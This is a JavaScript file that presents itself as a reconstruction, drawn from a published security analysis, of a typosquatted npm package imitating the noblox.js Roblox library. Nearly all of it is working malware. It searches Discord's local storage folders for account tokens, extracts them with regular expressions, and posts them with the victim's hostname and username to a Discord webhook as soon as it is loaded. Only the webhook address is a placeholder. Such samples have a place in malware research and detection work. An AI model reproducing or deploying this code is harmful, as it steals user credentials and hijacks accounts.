// noblox.js-vps — reconstructed from public security analyses
// Source: https://www.reversinglabs.com/blog/fake-roblox-api-packages-luna-grabber-npm
//
// August 2024: Typosquatting noblox.js (legitimate Roblox API wrapper).
// Steals Discord tokens from browser local storage and sends to webhook.
//
// Technique: Discord token theft from %APPDATA% + webhook exfiltration

const https = require("https");
const fs = require("fs");
const path = require("path");
const os = require("os");

function getDiscordTokens() {
  var tokens = [];
  var home = os.homedir();

  // Discord token locations (Windows)
  var discordPaths = [
    path.join(home, "AppData", "Roaming", "discord", "Local Storage", "leveldb"),
    path.join(home, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"),
    path.join(home, "AppData", "Roaming", "discordptb", "Local Storage", "leveldb"),
  ];

  // Linux paths
  discordPaths.push(
    path.join(home, ".config", "discord", "Local Storage", "leveldb")
  );

  for (var i = 0; i < discordPaths.length; i++) {
    try {
      if (!fs.existsSync(discordPaths[i])) continue;
      var files = fs.readdirSync(discordPaths[i]);
      files.forEach(function (file) {
        if (file.endsWith(".ldb") || file.endsWith(".log")) {
          var content = fs.readFileSync(path.join(discordPaths[i], file), "utf8");
          // Match Discord token patterns
          var matches = content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g) ||
            content.match(/mfa\.[\w-]{84}/g);
          if (matches) {
            tokens = tokens.concat(matches);
          }
        }
      });
    } catch (e) {}
  }

  return [...new Set(tokens)]; // deduplicate
}

function exfiltrate(tokens) {
  if (tokens.length === 0) return;

  var data = JSON.stringify({
    content: "New tokens found!",
    embeds: [{
      title: "Discord Token Grab",
      description: tokens.join("\n"),
      fields: [
        { name: "Hostname", value: os.hostname() },
        { name: "Username", value: os.userInfo().username },
        { name: "Platform", value: os.platform() }
      ]
    }]
  });

  // Exfiltrate via Discord webhook
  var options = {
    hostname: "discord.com",
    path: "/api/webhooks/1234567890/fake-webhook-token",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(data)
    }
  };

  var req = https.request(options);
  req.write(data);
  req.end();
}

var tokens = getDiscordTokens();
exfiltrate(tokens);
